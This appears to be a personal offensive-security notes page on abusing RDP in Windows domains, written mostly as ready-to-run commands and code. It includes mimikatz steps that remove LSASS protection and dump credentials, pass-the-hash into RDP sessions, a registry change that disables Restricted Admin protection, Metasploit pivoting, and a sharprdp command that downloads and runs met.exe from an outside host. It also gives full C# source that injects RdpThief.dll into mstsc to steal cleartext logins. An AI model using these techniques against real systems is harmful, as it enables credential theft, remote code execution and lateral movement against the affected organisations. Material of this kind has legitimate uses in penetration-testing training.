---
layout:     post
author:     0x5c4r3
type: docs
permalink: Abusing_RDP
---

<span style="font-size: 35px; color:red"><b>Abusing RDP</b></span>
&nbsp;
When an RDP connection is created, the NTLM hashes will reside in memory for the duration of the session.

When there's an active RDP session, you can dump the creds with _mimikatz_ like so:
```shell
privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

To pass the NTLM hash of another user to get RDP session:
```shell
privilege::debug
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```
This should open a RDP prompt saying "Your Windows logon credentials will be used to connect"

If you see "Account restrictions are preventing...", probably Restricted Admin Mode is on, so run:
```
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```
That will open a powershell, then type these commands:
```powershell
Enter-PSSession -Computer appsrv01
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
Exit
```
The restricted admin mode setting is updated instantly and we can once again use it to gain access to the target.

<span style="font-size: 25px; color:white"><b>RDP//XfreeRDP</b></span>
You can do all this stuff also with xfreerdp:
```shell
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
```

---

<span style="font-size: 25px; color:white"><b>Reverse RDP Proxy</b></span>
Once already gotten the revshell on meterpreter, put it in background and run:
```shell
use multi/manage/autoroute
set session 1
exploit
```
and then
```shell
use auxiliary/server/socks4a
set srvhost 127.0.0.1
exploit -j
```
The autoroute module creates a reverse tunnel and allows us to direct network traffic into the appropriate subnet.

<span style="font-size: 25px; color:white"><b>RDP as a console</b></span>

RDP based on mstsc.exe which is based on mstscax.dll (which perform authentication). sharpRDP allows the execution of code through the SendKeys function.

To issue single commands through RDP without an actual RDP session open:
```shell
sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
```

---
<span style="font-size: 25px; color:white"><b>Get cleartext credentials with an open RDP Session</b></span>

Application similar to a keylogger for RDP
```cs
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

		static void Main(string[] args)
		{
		  String dllName = "C:\\Tools\\RdpThief.dll";
		  while(true)
		  {
		    Process[] mstscProc = Process.GetProcessesByName("mstsc");
		    if(mstscProc.Length > 0)
		    {
		      for(int i = 0; i < mstscProc.Length; i++)
		      {
		        int pid = mstscProc[i].Id;

		        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
		        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
		        IntPtr outSize;
		        Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
		        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
		        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
		      }
		    }
                   
		    Thread.Sleep(1000);
		    }
		}
	}
}
```
Compile it as  <span style="color:red">exploit.exe</span> and run:
```shell
mstsc.exe
exploit.exe
type C:\Users\dave\AppData\Local\Temp\6\data.bin
```
